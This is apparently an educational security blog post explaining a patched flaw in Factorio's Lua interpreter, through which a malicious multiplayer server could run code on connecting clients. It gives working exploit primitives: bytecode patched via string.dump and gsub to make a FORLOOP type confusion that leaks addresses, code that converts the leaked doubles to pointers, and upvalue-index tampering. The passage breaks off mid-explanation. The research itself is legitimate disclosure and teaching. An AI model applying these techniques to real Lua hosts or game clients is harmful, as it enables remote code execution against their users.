# Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws

Dynamic languages are safe from memory corruptions bugs, right?

29/06/2024 

  * [Research](https://memorycorruption.net/tags/research)
  * [Pwn](https://memorycorruption.net/tags/pwn)
  * [Lua](https://memorycorruption.net/tags/lua)

![Rocket Man](/posts/rce-lua-factorio/rocket-man_huafd99224b33f189054ca835273c63a66_4611746_1920x1080_resize_q75_bgffffff_box_3.jpg)

Some months ago I exploited a vulnerability in the Lua implementation of [Factorio](https://www.factorio.com/ "Official Page") that **allowed a malicious server to obtain arbitrary execution on clients**. As the vulnerability has been patched for months already (Factorio versions **below 1.1.101** are affected), is time to share the details with the community.

I think this is a very interesting topic, that can serve as an introduction to understand other dynamic languages such as _Javascript_ , where similar ideas are used for exploitation. For this reason, this is an **in-depth** explaination of the vulnerability, so that it can be used by others as a reference to understand how these attacks work.

In addition to this, at the end of the post you will find a **challenge** to practice the techniques explained in this post in a gamified environment, **directly in your browser**.

**You can jump directly to the challenge:** Your Turn

# What is Factorio?

Factorio is a game in which you automate a factory to build a rocket and escape from a planet. Based on their website, they have sold more than [3,500,000 copies of the game](https://factorio.com/support/press-kit) , making it a juicy target for security researchers

[ ![YouTube video](/posts/rce-lua-factorio/trailer-thumbnail_hua1ccbde770766f8f651c43923245a36d_342261_1280x0_resize_q75_box.jpg) ](https://www.youtube.com/watch?v=BqaAjgpsoW8)

## How is Lua used in the game?

Lua is used in Factorio to implement some game logic and to **create mods** and **custom maps** that can be downloaded from in-game or from their [website](https://mods.factorio.com/ "Mods Browser") . The modding community is very active, so there are _thousands_ of mods available, some with even **more than half a million downloads**

![Alien Biomes mod](/posts/rce-lua-factorio/most-downloaded-mod_hu87ef96f0b4805001ffaa3865c33619a2_101420_1157x240_resize_q75_bgffffff_box_3.jpg) The Alien Biomes mod has 551K downloads

Based on this information, it might seem that the surface of the _Lua interpreter_ in the game is limited to **local exploits** that _require the user to download a malicious mod_. That would already be an issue, as compromising one mod (either finding a vulnerability in it / compromising the source) has the potential to reach **millions of users** , but we are missing a small detail that **exposes the lua interpreter to the network** , opening the door to more interesting attacks

## The more the merrier

On the [Factorio wiki](https://wiki.factorio.com/Desynchronization) there is a **very important** implementation detail of the multiplayer mode:

> Factorio multiplayer code uses deterministic lockstep to synchronize clients. This is a method of synchronizing a game from one computer to another by sending only the user inputs that control that game, rather than networking the state of the objects in the game itself. It means that **all player’s games need to simulate every single tick of the game identically**. If any computer does something ever-so-slightly different, a desynchronization (desync) occurs. The game includes processes to ensure any issues with network traffic do not cause desyncs.

That means that _if_ one player executes some Lua code, the rest of the players **must** execute it in order to preserve the syncronization of the game. Failing to do so will result in a desync state, disconnecting the client from the game with an error message, as also seen in the wiki

![Desync Error](/posts/rce-lua-factorio/desync-report_hu46d39e92e2be0de222db9019c39a011e_60830_1101x192_resize_q75_box.jpg)

So we now know that any Lua code we execute is also executed by the rest of players. _What are our options to execute lua code?_ After some research, we end up with **two options** :

  1. Use the `/c` command to execute Lua code in a server (if we have _permission_ to do it)
  2. Creating a custom map that **contains lua code** so it gets executed when a client connects to the server

As both options require privileges on a server, we might as well go for the second path.

As the game also features an in-game server browser, an attacker could make it visible there to atract victims.

# Going Deeper

## General Exploitation Path

Now that we have a clear path to reach the Lua interpreter from the network, let’s take a quick look at the general exploitation path that we will follow:

  1. We host a Factorio server that is serving a _malicious map_. This map will contain our exploit as part of the Lua code that defines the scenario of the map
  2. When a client connects to our server, they download the map and **execute the Lua code** associated with it (as we have seen before, as state is not shared, clients need to execute the Lua code to ensure syncronization between them)
  3. Our payload will leverage weaknesses in the Lua implementation to _craft fake objects_
  4. These fake objects will allow us to _leak/corrupt_ memory to alter the behaviour of the program
  5. We follow one of the many techniques to gain code execution by leveraging these powerful primitives

## A small leak will sink a great ship

As one can imagine, the official [Lua interpreter](https://www.lua.org/) contains _modules_ that allow scripts to interact with the host in multiple common ways, such as opening files, executing commands, getting environment variables… While this might be desirable on normal circumstances, is definitely not okay when executing untrusted code. For this reason, a basic hardening recommendation is to _completely disable these modules_ when compiling Lua for those sensitive environments.

This is the case in Factorio too, where only the following modules are compiled:

  * [debug](https://www.lua.org/manual/5.2/manual.html#6.10) \- Provides Access to Debug functionalities
  * [math](https://www.lua.org/manual/5.2/manual.html#6.6) \- Interface to standard C Math
  * [bit32](https://www.lua.org/manual/5.2/manual.html#6.7) \- Bitwise operations
  * [string](https://www.lua.org/manual/5.2/manual.html#6.4) \- Manipulation of strings
  * [table](https://www.lua.org/manual/5.2/manual.html#6.5) \- Manipulation of tables
  * [base](https://www.lua.org/manual/5.2/manual.html#6.1) \- Core Functions of Lua, such as `print`

However, the devil is in the details, and while modules that have names like `os` with functions like `execute` are easily recognizable are **dangerous** , others like `load` or `loadstring` that are part of the `base` module might be seem as benign, while they are arguably **the most powerful functions of Lua**.

_Why are these functions so powerful?_ Because they allow executing **bytecode**.

### Who controls the Bytecode controls the future

Lua is an _interpreted language_ , but it doesn’t execute the code we write as it is, first, **it is compiled**. This might be a surprise to some, as it seems to be incompatible with the classic view of an interpreted language. However, details are important, **Lua doesn’t compile to machine code** , that is, code that your CPU understands. Instead, it compiles into _Lua bytecode_ , which is a representation of the code that can only be executed by the Lua interpreter, making it still an interpreted Language.

Source code is useful for humans, as it is easily readable, but text is hard to work with for computers, so bytecode is a more useful representation for them.

Let’s see this in practice so we get a clearer view of how this works.

If we have the following code:
  
  
  print("MemoryCorruption")
  

Lua is going to generate and execute the following bytecode:

All the bytecode snippets in this post were created with `luac -l -l <script>`. **luac** is provided together with the Lua interpreter 
  
  
  1	GETTABUP	0 0 -1	; _ENV "print"
  2	LOADK	1 -2  ; "MemoryCorruption"
  3	CALL	0 2 1	
  4	RETURN	0 1	
  

Without knowing anything about bytecode, we can see that somehow Lua is getting the function `print`, loading a constant `MemoryCorruption`, calling print and finally returning.

This bytecode is what gets executed by the interpreter, there are no more conversions or _checks_. This is why being able to execute bytecode directly is **so powerful** , because you gain the ability to execute **incorrect bytecode** that under normal circunstances, the compiler **would never generate**

For example, what happens if I modify the previous `LOADK` opcode, that is used to load a constant to use a **Out-Of-Bounds index**? Does the interpreter prevents me from doing that? Or does it leak memory?

## Bytecode Verifier

Aware of the dangers of directly executing bytecode, Lua developers implemented a bytecode verifier in an attempt to protect the interpreter from malicious bytecode. However, it was removed in version 5.2 as it was repeatedly found to be bypassable

> Following several bytecode exploits found by the relentless Peter Cawley and others, we are considering dropping the bytecode verifier completely in Lua 5.2. It seems useless to make a promise that we can’t seem to deliver without a much more complicated verifier than the current one, and possibly with the need for costly runtime checks as well.
> 
> Our impression is that applications that are open to running arbitrary Lua code provided by the user should avoid accepting precompiled scripts. So we think that adding a flag to load (the Lua function from the base library) to check for and reject precompiled scripts is enough for Lua-based apps to be able to reject precompiled scripts if they want to. We don’t think anything else is needed in the C side, since you can always write you own lua_Reader function to reject precompiled scripts.
> 
> At the same time, shedding the bytecode verifier would allow applications that run their own precompiled scripts that are deemed safe to avoid the cost of the bytecode verifier. The checks would be limited to the sanity tests done in lundump.c, which should be enough for flagging accidental file corruption.

> All feedback is welcome. Thanks. –lhf 1

Even if the official bytecode verifier was not implemented in Lua 5.2.1, Factorio developers seem to have implemented their own in an attempt to protect the Lua interpreter2. These protections focused primarly in avoiding clearly **OOB parameters** , like trying to jump outside the code or loading a constant with an index bigger than the constants array

This bytecode verifier had some **Off-By-One** issues, as some opcodes can be a little confusing. For example, `JMP 0` does not really make sense, as it would basically make an infinite loop, so the jump opcode is **offset by one by default**. This wasn’t taken into account in the verifier, so it was possible to jump outside the code block.

This was an issue by itself as there exists the possiblity that the constants are allocated just after the code chunk, so an attacker could **store bytecode in the constants section** to bypass the checks and then jump to it with the off by one. As Lua ignores malformed instructions, the metadata of the chunk would be ignored in most cases, **resulting in execution of the constants as bytecode**.

# Building Blocks

In interpreted languages such as _Javascript_ and _Lua_ , an _incredibly powerful primitive_ is the ability to create **fake objects**. This is because it allow us to **leverage the full power of the interpreter in our advantage** ; Strings can be used to leak arbitrary data, arrays allow to write to arbitrary memory and if the language has a way to call native functions, we can use it to control the execution flow.

In addition to this, _exploitation can be as complex as we need_ , as our exploit can make decisions and calculate values dynamically, because at the end we are still executing _Javascript/Lua_ code.

For these reasons, our goal is to gain the ability to create these **fake objects**.

To fulfil this goal, we basically need two things:

  * **The ability to leak addresses** : this will allow to place our fake objects in strings, as we will be able to locate them in memory
  * **A way to retrieve an object from an address** : if we can retrieve an object from an arbitrary address, we can use the addresses leaked to get fake objects

## Leaking Addresses

Normally, leaking addresses in Lua is a feature of the print function:
  
  
  [MemoryCorruption src] ./lua -e 'function foo() end print(foo)'
  function: 0x1673490
  

However, not only this was **removed in Factorio** , it also _doesn’t leak the address of strings_ , which we want to use to store our fake objects. That means that we will have to craft our own primitive to leak addresses.

A common way to leak addresses in Lua is by **leveraging type confusions between objects**.

### Introduction to TValues

To understand how a type confusion leads to leaking addresses, we first need to understand how objects internally work in Lua.

As we know, Lua is a **dynamic language** , so a variable can change its type during runtime:
  
  
  foo = "A"
  print(foo)
  -- Output: A
  foo = 1
  print(foo)
  -- Output: 1
  foo = print
  print(foo)
  -- Output: function
  

However, Lua is written in **C** , which is a **static language** , that means that the type of variables is **set on stone after compilation**. How is possible to build a dynamic language on a static one? Like most things in Computer Science, by adding another **abstration** layer.

Internally in Lua, objects are represented with the `TValue` structure
  
  
  pwndbg> ptype TValue
  type = struct lua_TValue {
  Value value_;
  int tt_;
  }
  

Where the `tt_` attribute defines the type of the `TValue` and the `Value` attribute is used to access the object represented by the `TValue`.

As we can see, by doing this, Lua can easily implement dynamic types. In Lua, **everything is a TValue** , so changing the type of a variable just means replacing one _TValue_ with _another TValue_. When doing operations with the TValues, Lua just has to check the `tt_` property to know how to access it and what operations are valid.

Inside the `Value` union we have the value of a `TValue`:
  
  
  pwndbg> ptype /o Value
  type = union Value {
  /*  8 */  GCObject *gc;
  /*  8 */  void *p;
  /*  4 */  int b;
  /*  8 */  lua_CFunction f;
  /*  8 */  lua_Number n;
  /* total size (bytes):  8 */
  }
  

As we can see, it is basically a _space_ of **8 bytes** that is interpreted either as a double or as a pointer to another structure depending on the type of the `TValue`.

Notice how **numbers are an special case**. Lua represents **all numbers as doubles**3, so there is no need to use a pointer to access it, they can be **stored inline** in the `Value` union to save space and make access faster, as they have the same size of a pointer.

This detail is **KEY** to leaking pointers in Lua (and also in **V8**!). If we can make Lua think our `String` is a `Number`, instead of accessing the `Value` union as a pointer, it will be accessed as a _double_. That means that **the pointer of the string will be used as a double** , which might allow us to leak it depending on how is used.

### FORLOOP

A common place to confuse the types of objects is in loops 4. If we can make Lua think any object passed as the initial start point of a numeric loop is a number, we could leak its address, as it would be available to us as a variable.

In Lua, loops are implemented by the `FORLOOP` opcode. This opcode **is always preceded** by a `FORPREP` opcode on numeric loops that checks the type of the arguments and prepares the loop.
  
  
  vmcase(OP_FORPREP,
  const TValue *init = ra;
  const TValue *plimit = ra+1;
  const TValue *pstep = ra+2;
  if (!tonumber(init, ra))
  luaG_runerror(L, LUA_QL("for") " initial value must be a number");
  else if (!tonumber(plimit, ra+1))
  luaG_runerror(L, LUA_QL("for") " limit must be a number");
  else if (!tonumber(pstep, ra+2))
  luaG_runerror(L, LUA_QL("for") " step must be a number");
  setnvalue(ra, luai_numsub(L, nvalue(ra), nvalue(pstep)));
  ci->u.l.savedpc += GETARG_sBx(i);
  )
  

That means that if we try to leak the address of a function with a loop without messing with the bytecode…
  
  
  foo = function(x)
  for i = x, 100000000000000, 0 do return i end
  end
  
  print(foo(foo))
  

We get an error due to passing a function instead of a number as the `for` value
  
  
  ./lua: poc.lua:2: 'for' initial value must be a number
  stack traceback:
  poc.lua:2: in function 'foo'
  poc.lua:5: in main chunk
  [C]: in ?
  

However, if we check the code of the `FORLOOP` opcode, the `step` parameter type is not checked, and there is even a comment saying that it is fine
  
  
  vmcase(OP_FORLOOP,
  /* not checking ra+2, because I don't see way how to exploit it not being number */
  if (!ttisnumber(ra+1) | !ttisnumber(ra))
  luaG_runerror(L, LUA_QL("for") " bytecode error, control variables need to be numbers");
  lua_Number step = nvalue(ra+2);
  lua_Number idx = luai_numadd(L, nvalue(ra), step); /* increment index */
  lua_Number limit = nvalue(ra+1);
  if (luai_numlt(L, 0, step) ? luai_numle(L, idx, limit)
  : luai_numle(L, limit, idx)) {
  ci->u.l.savedpc += GETARG_sBx(i);  /* jump back */
  setnvalue(ra, idx);  /* update internal index... */
  setnvalue(ra+3, idx);  /* ...and external index */
  }
  )
  

As `step` is not type checked, its value will be passed to the `nvalue` call to get its value
  
  
  lua_Number step = nvalue(ra+2);
  

Where `nvalue` is a macro used to access the number contained in a `TValue` that represents a number
  
  
  #define nvalue(o)	check_exp(ttisnumber(o), num_(o))
  

`check_exp` is another macro that **triggers a Lua assert if the first parameter is not true**. As the `ttisnumber` macro checks if the object passed is a Number, this check seems to prevent us from confusing types on Lua. However, the `check_exp` macro has to be enabled on compile time to trigger an assert and by default does nothing
  
  
  /* internal assertions for in-house debugging */
  #if defined(lua_assert)
  #define check_exp(c,e)		(lua_assert(c), (e))
  #else
  #define lua_assert(c)		((void)0)
  #define check_exp(c,e)		(e)
  #endif
  

As this assertion is disabled, **type is not checked** and the `num_` macro is executed with any object we pass to the function, leaking the value of the `Value` attribute of the `TValue` passed (which can be a pointer)
  
  
  #define val_(o)		((o)->value_)
  #define num_(o)		(val_(o).n)
  

All this means that if we craft our own bytecode, we could leverage the type confusion and leak addresses. This is an example of why the ability to execute our own bytecode is so powerful, it allows us to **create circunstances that the compiler would never generate from source code**.

Let’s craft our own bytecode to exploit this vulnerability. The bytecode generated by the compiler is the following, notice how the `FORLOOP` opcode is preceded by a `FORPREP` opcode.
  
  
  1	[2]	LOADK  1 -1	; 0
  2	[2]	LOADK  2 -2	; 1000000000000
  3	[2]	MOVE  3 0
  4	[2]	FORPREP  1 1	; to 6
  5	[2]	RETURN  4 2
  6	[2]	FORLOOP  1 -2	; to 5
  7	[3]	RETURN  0 1
  

We can patch this opcode to remove the type check and leverage the type confusion in `FORLOOP`, as **there is no check in the bytecode verifier that prevents us from removing it**
  
  
  1	[2]	LOADK  1 -1	; 0
  2	[2]	LOADK  2 -2	; 1000000000000
  3	[2]	MOVE  3 0
  4	[2]	JMP  0 1	; to 6
  5	[2]	RETURN  4 2
  6	[2]	FORLOOP  1 -2	; to 5
  7	[3]	RETURN  0 1
  

With this change we can start leaking addresses. Let’s try to leak the address of a string
  
  
  asnum = loadstring(string.dump(function(x)
  for i = 0, 1000000000000, x do return i end
  end):gsub("\x61\0\0\x80", "\x17\0\0\128"))
  
  foo = "Memory Corruption"
  
  print(asnum(foo))
  

Running this code gives us an **odd double value**
  
  
  [MemoryCorruption src] ./lua poc.lua 
  2.1944577826691e-317
  

As we have seen before, all numbers in Lua are represented as **doubles**3, so when we try to leak a pointer, **Lua thinks the value is also double**. However, _pointers are not doubles_ , so they are **not encoded as such** , leading to _odd values_ when used as doubles.

As we already know that Lua doesn’t have integers, we need a way to **properly encode** the pointers as doubles to obtain the real value. And for that, we first need to **understand what are floating-point numbers**.

#### IEEE 754 double-precision

Doubles are represented using the **IEEE 754 binary64 format**. In this format, they are formed by three parts:

  * **Sign** : 1 bit
  * **Exponent** : 11 bits
  * **Mantissa** : 52 bits

![Double Representation](/posts/rce-lua-factorio/double.svg) Sign: 1 bit. Exponent: 11 bits. Mantissa: 52 bits

So they are basically **64 bits of data** , nothing makes them intrinsically different from an `integer`, the only difference is the way bits get interpreted. We already knew this, as this is what allows them to be stored inline in the `Value` union

This also means that in Python we can just pack it to bytes an then unpack it as a `integer` to obtain the pointer we leaked, as they have the same size.

This **only works in our case** as the leak is a _“fake”_ floating-point number. Doing this for _real_ floating-point numbers will lead to **errors**
  
  
  import struct
  
  # Convert the floating-point number to a number
  double_bytes = struct.pack('<d', 2.1944577826691e-317)
  number = struct.unpack("<q", double_bytes)[0]
  
  print(hex(number)) # Output: 0x43c620
  

Unfortunately, with Lua **things gets complicated**. Lua 5.2 doesn’t have the ability to pack/unpack, and more important, **it doesn’t even have integers**.

That means that as we can’t represent our leak as a real `integer`, beyond **53 bits** we will encounter **precision limitations** when trying to represent integers, as from that point, integers **no longer fit in the mantissa** and only some numbers will not suffer from precision limitations 5. But there is also a **bright side** , we have **53 bits in which there is no difference between the precision of an integer and a double**.

As **53 bits** ~~ought to be enough for anyone~~ are **enough to leak adresses** , we just need a way to convert **fake doubles to properly encoded doubles**.

##### From “Doubles” to Doubles; The Painful Way

If we had a way to access the bits of the double, the conversion would be easy. However, we can’t use bitwise operations, because _what does it even mean to do a bitwise operation on a double?_ We need to find a different way to obtain the bits of a float

The most comprensible way that I know is by using the `string.format` method with the `%a` format string.

This provides us a string containing the _double_ in hexadecimal. We will specifically use `%.13a` to force a mantissa of 13 hex characters (52 bits) to be printed so we don’t have to pad it ourselves.
  
  
  -- We use the value we leaked before as an example
  local double_as_string = string.format("%.13a", 2.1944577826691e-317)
  print(double_as_string)
  

This provides us with the string: `0x0.000000043c620p-1022`, which corresponds to: 6

  * **First part** : indicates if the double is **denormalized** (`0x0` if denormalized).
  * **Second part** : mantissa hex encoded followed by `p` character
  * **Third part** : exponent part **decimal** encoded

![Hex Encoding of Double](/posts/rce-lua-factorio/double_hex.svg) Number is denormalized. Mantissa is `000000043c620p`. Exponent is `-1022`

This uncovers a new interesting fact about floating-point numbers. As we know from the output of the Python code, our leaked value is `0x43c620`. Which as we can see, is basically the value of the **mantissa**. _But what about the exponent?_ With our current knowledge of floating-point numbers, **we can’t explain an exponent of -1022**. As far as we know, it **should be zero** , _what is happening here?_

##### Exponent Bias

This discrepancy occurs due to the way floating-point numbers are encoded. The _exponent_ of floating-point numbers use biased representation7, which is a way to encode **signed numbers** by encoding the offset from a number known as the _bias_ : `exponent = encoded_value - bias`

In the case of doubles, this _bias_ is `1023`, which means that the exponent will take values between `-1022` and `1023`

  * `encoded_exp = 00000101010 = 42` -> `exponent = 42 - 1023 = -981`
  * `encoded_exp = 11111010000 = 2000` -> `exponent = 2000 - 1023 = 977`

As you might already notice, if the exponent has **11 bits** , that means that it can represent `2**11 = 2048` possible values, but we are missing **two** , when they are all `0` and when they are all `1`. This is because they have an **especial meaning** :

  * `encoded_exp = 00000000000` means that the number is **denormalized** (or a **signed zero** if the mantissa is 0)
  * `encoded_exp = 11111111111` means **Inf** (if mantissa 0) or **NaN** (if mantissa is not zero)

This explains **why our pointer has an ood value**. Lua thinks it is a **denormalized** number as the exponent was zero while the mantissa was not zero.

Denormalized numbers are basically **very small numbers**. For a double, they start at values smaller than `2**-1022` 8
  
  
  print(string.format("%.13a", 2^-1022))
  -- Output: 0x1.0000000000000p-1022 (Value different from 0x0 means normal number)
  print(string.format("%.13a", 2^-1023))
  -- Output: 0x0.8000000000000p-1022 (0x0 means denormalized number)
  

This is also **why the exponent of our leaked value was -1022**. As our number was denormalized and it was indicated by the first part of the output, the exponent is no longer useful for us (as it only indicated that is denormalized, which we already knew), so it seems to be fixed at `-1022`, the smallest representable exponent.

##### Are we double yet?

There are basically **two cases** we need to handle:

  * **Denormalized Numbers** : the integer value fits in the _mantissa_ , we decode the mantissa to obtain the correct double.
  * **Normal numbers** : the value _does not fit in the mantissa_. The best we can do to recover the original value is to calculate the number as `(exponent + 1023) * 2^52 + mantissa` (if the number is not representable as a double, we lose data doing this)

If we really wanted to handle _any number_ without losing data, we could store the value in **two doubles** and make functions to operate with them as an `integer`

Here is a Lua implementation of this idea:
  
  
  function double_to_number(double)
  -- Force representation of mantissa with 13 bytes of precision
  local double_as_string = string.format("%.13a", double)
  local denormalized, mantissa, exponent = string.match(double_as_string,
  "-?0x([a-fx0-9]*).([a-f0-9]*)p?(-?[0-9]*)")
  
  -- Convert to number
  denormalized = tonumber(denormalized, 16)
  mantissa = tonumber(mantissa, 16)
  exponent = tonumber(exponent)
  
  if denormalized == 0 then
  -- If denormalized, it means that the leaked value had zeros
  -- in the position of the exponent
  -- That means the number fits the mantissa, 
  -- so we don't have to do anything with our new double to represent it
  real_exponent = 0 
  else
  -- In this case, the leaked value had a value different
  -- value from zero in the exponent.
  -- That means the number does NOT fit the mantissa.
  -- We need to calculate the real value and then
  -- try to represent it as a double
  real_exponent = (exponent + 1023) * 2^52 -- Shift 52 bits (size of mantissa)
  end
  
  return real_exponent + mantissa
  end
  

Which we can finally add to our `FORLOOP` code to transform the leaked pointer
  
  
  foo = "Memory Corruption"
  
  leak = asnum(foo)
  print("Leak: " .. leak)
  print(string.format("Pointer: 0x%x", double_to_number(leak)))
  -- Output:
  -- Leak: 2.1965605260578e-317
  -- Pointer: 0x43d6c0
  

We can then check in GDB that `0x43d6c0` is in fact the correct pointer:
  
  
  pwndbg> x/20s 0x43d6c0
  0x43d6c0:	"\340nC"
  0x43d6c4:	""
  0x43d6c5:	""
  0x43d6c6:	""
  0x43d6c7:	""
  0x43d6c8:	"\004\002"
  0x43d6cb:	""
  0x43d6cc:	"\222\311X+\021"
  0x43d6d2:	""
  0x43d6d3:	""
  0x43d6d4:	""
  0x43d6d5:	""
  0x43d6d6:	""
  0x43d6d7:	""
  0x43d6d8:	"Memory Corruption"
  0x43d6ea:	""
  0x43d6eb:	""
  0x43d6ec:	""
  0x43d6ed:	""
  0x43d6ee:	""
  

Our string is not exactly at the address leaked as we leaked the address of a TString structure, the internal representation of strings in Lua
  
  
  type = union TString {
  /*  8 */  L_Umaxalign dummy;
  /*  24 */  struct {
  /*  0  |  8 */  GCObject *next;
  /*  8  |  1 */  lu_byte tt;
  /*  9  |  1 */  lu_byte marked;
  /*  10  |  1 */  lu_byte extra;
  /* XXX  1-byte hole  */
  /*  12  |  4 */  unsigned int hash;
  /*  16  |  8 */  size_t len;
  /* total size (bytes):  24 */
  } tsv;
  
  /* total size (bytes):  24 */
  }
  

The real string is after this header, that is, `24 bytes` after the leaked pointer:
  
  
  pwndbg> x/s 0x43d6c0+24
  0x43d6d8:	"Memory Corruption"
  

## Confusing Upvalues

Now that we have a way to leak addresses, we need a primitive that allows us to retrieve fake objects. To do this, we first need to understand how **upvalues** and **Closures** work in Lua.

### What are Upvalues?

**Upvalues** are a way **to access variables outside the scope of the current function**. Consider the following example that calculates the Fibonacci secuence:
  
  
  function fibonacci(n)
  local a = 1
  local b = 1
  
  function nextValue()
  -- 'a' and 'b' are upvalues, as they are defined in the outer function
  return a + b
  end
  
  for i=0, n do
  tmp = a
  a = nextValue()
  b = tmp
  end
  return b
  end
  

The `nextValue` function accesses both `a` and `b` variables even if they are outside its scope, that is because both variables are defined as upvalues. We can see that this is true by taking a look at its bytecode:
  
  
  upvalues (2) for nextValue:
  0	a	1	1
  1	b	1	2
  

The format of the upvalues section is the following:

  1. **Index** : position in the upvalues array of the function
  2. **Name** : name of the upval
  3. **In Stack** : indicates if the upval is located in the stack (one if located in the stack)
  4. **Stack Index** : offset of the upval from the base address of the stack

So we know that both `a` and `b` are upvalues located in the stack, with `a` located at `base + 1` and `b` at `base + 2`

### The Gift that Keeps on Giving

As you might start thinking, we control the bytecode that gets loaded, and **upvalues are defined in the bytecode** , _what happens if we modify the index of an upvalue to point to a different offset of the stack?_

Let’s try it, first we define a function that has three upvalues
  
  
  function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  end)()
  end
  

If we execute the code _without any modification to the bytecode_ , we get `nil` as the output, as the upvalues haven’t been assigned any value yet
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  nil
  

Now we are going to **manipulate the index** of the `target` upval. To do this, we need to know its current position:

The `_ENV` upvalue is used to get the address of the `print` function, and is not important for our purposes 
  
  
  upvalues (4) for 0xd587a0:
  0	_ENV	0	0
  1	foo	1	0
  2	bar	1	1
  3	target	1	2
  

As it is currently `2`, we are going to increase it to `3`. We can do that with this code:
  
  
  poc = string.dump(function()
  local foo
  local bar
  local target
  (function()
  print(foo)
  print(bar)
  print(target)
  end)()
  end)
  -- Modify upvalue index of target to be idx + 1
  poc = poc:gsub("(\x00\x00\x01\x00\x01\x01\x01)\x02", "%1\x03", 1)
  poc = load(poc)
  poc()
  

Here we _dump the bytecode_ of the function with `string.dump` and then modify the index of the last upvalue with a substitution. We use `"(\x00\x00\x01\x00\x01\x01\x01)\x02"` as the pattern because each upvalue has one byte to indicate if it is located in the stack and another to indicate the index, making it unique enough for our purpose.

Execution of the **manipulated bytecode** reveals something interesting:
  
  
  [MemoryCorruption src]$ ./lua poc.lua 
  nil
  nil
  LClosure: 0x7a6d00
  

An _unmodified version of Lua_ will return `function` instead of `LClosure`, as the default `print` function considers closures functions 

Instead of `nil`, we got an `LClosure`, _but what is an LClosure?_ To understand it, **we need to know how functions work in Lua**

#### Closures and Prototypes

**Prototypes** are created when loading bytecode or when parsing the source code of a Lua script. As such, we could say that _prototypes_ are the **real functions** , as they contain all the information we would commonly associate with a function, like its bytecode, the start and end line of source code where it was defined, constants used…

They act kinda as a _template_ for functions
  
  
  typedef struct Proto {
  CommonHeader;
  TValue *k;  /* constants used by the function */
  Instruction *code;
  struct Proto **p;  /* functions defined inside the function */
  int *lineinfo;  /* map from opcodes to source lines (debug information) */
  LocVar *locvars;  /* information about local variables (debug information) */
  Upvaldesc *upvalues;  /* upvalue information */
  union Closure *cache;  /* last created closure with this prototype */
  TString  *source;  /* used for debug information */
  int sizeupvalues;  /* size of 'upvalues' */
  int sizek;  /* size of `k' */
  int sizecode;
  int sizelineinfo;
  int sizep;  /* size of `p' */
  int sizelocvars;
  int linedefined;
  int lastlinedefined;
  GCObject *gclist;
  lu_byte numparams;  /* number of fixed parameters */
  lu_byte is_vararg;
  lu_byte maxstacksize;  /* maximum stack used by this function */
  } Proto;
  

On the other hand, **Closures** are created **during execution of the Lua script** and associate a **Prototype** with its **Upvalues**.
  
  
  typedef struct LClosure {
  ClosureHeader;
  struct Proto *p; /* Function associated with the LClosure */
  UpVal *upvals[1];  /* list of upvalues */
  } LClosure;
  

The existence of **Closures** is what allows Lua to **implement upvalues** , as they abstract a function from its **upvals**. This is important as **the same function can have different upvals** on each call

We can see this mechanism in work with a function that returns a counter:
  
  
  function createCounter()
  -- On each call, a new local variable is created
  local count = 0
  return function ()
  -- Count is an upval of this function
  count = count + 1
  return count
  end
  end
  
  first_counter = createCounter()
  second_counter = createCounter()
  -- Increase the first counter
  print("Counter 1: " .. first_counter())
  -- Increase the second counter
  print("Counter 2: " .. second_counter())
  

In this code, the `createCounter` function returns a new function that can be used to increase an **upvalue** of the `createCounter` function. As a new `count` variable is created on each call, the function will return a different `LCLosure` when called. The same **prototype** will be used, as _they are the same funcion_ , but a different **upval** will be associated with it 9

#### Wait, is all TValues?

By modifying the index of the upvalue, we got a reference to the current function closure, that is because `LClosures` are **pushed to the stack on creation** and **just before upvalues are asigned to it**.
  
  
  /*
  ** create a new Lua closure, push it in the stack, and initialize
  ** its upvalues.
  */
  static void pushclosure (lua_State *L, Proto *p, UpVal **encup, StkId base,
  StkId ra) {
  int nup = p->sizeupvalues;
  Upvaldesc *uv = p->upvalues;
  int i;
  Closure *ncl = luaF_newLclosure(L, nup);
  ncl->l.p = p;
  setclLvalue(L, ra, ncl);  /* anchor new closure in stack */
  for (i = 0; i < nup; i++) {  /* fill in its upvalues */
  if (uv[i].instack)  /* upvalue refers to local variable? */
  ncl->l.upvals[i] = luaF_findupval(L, base + uv[i].idx);
  else  /* get upvalue from enclosing function */
  ncl->l.upvals[i] = encup[uv[i].idx];
  }
  luaC_barrierproto(L, p, ncl);
  p->cache = ncl;  /* save it on cache for reuse */
  }
  

The position of the `LClosure` in the stack depends on the opcode `CLOSURE`, which as the name indicates, is reponsible for the creation of closures in Lua and is defined as:
  
  
  R(A) := closure(KPROTO[Bx])
  

This basically means to create a new **Closure** based on the **prototype at position Bx** of the current _function prototype_ array of prototypes (function prototypes are stored in the prototype of the function that defined it), and store it at position `R(A)`, which is a macro that means `base + A`, so at an offset from the current function stack (which seems to always be just after the local variables).

This explains why when we modified the index of the last _upval_ we got the `LClosure` of the function
  
  
  function (4 instructions at 0x225b540)
  0 params, 4 slots, 1 upvalue, 3 locals, 0 constants, 1 function
  1	[19]	LOADNIL  0 2
  2	[28]	CLOSURE  3 0	; 0x225bc80
  3	[22]	CALL  3 1 1
  4	[29]	RETURN  0 1
  constants (0) for 0x225b540:
  locals (3) for 0x225b540:
  0	foo	2	5
  1	bar	2	5
  2	target	2	5
  upvalues (1) for 0x225b540:
  0	_ENV	0	0
  

As our function had **three locals** , the `CLOSURE` opcode has `3` as the `A` parameter, meaning that the `LClosure` is stored at `base + 3`. When we modified the last upval to point to the index **3** , we got the `TValue` stored at `base + 3`, that is, the **LClosure**.

As closures are **first class citizens** in Lua, they are also a `TValue`, so they are no more especial than any other variable.

#### TOCTOU: Type of Check != Type of Use

We just learned that _Closures_ are like any other variable in Lua. This arises a question, _what prevents a user from calling a variable like a string as a function and crash Lua?_

The answer, as you can imagine, is a **type check** when trying to call a `TValue`
  
  
  int luaD_precall (lua_State *L, StkId func, int nresults) {
  lua_CFunction f;
  CallInfo *ci;
  int n;  /* number of arguments (Lua) or returns (C) */
  ptrdiff_t funcr = savestack(L, func);
  switch (ttype(func)) {
  case LUA_TLCF:  /* light C function */
  f = fvalue(func);
  goto Cfunc;
  case LUA_TCCL: {  /* C closure */
  /* Redacted */
  return 1;
  }
  case LUA_TLCL: {  /* Lua function: prepare its call */
  /* Redacted */
  return 0;
  }
  default: {  /* not a function */
  func = tryfuncTM(L, func);  /* retry with 'function' tag method */
  return luaD_precall(L, func, nresults);  /* now it must be a function */
  }
  }
  }
  

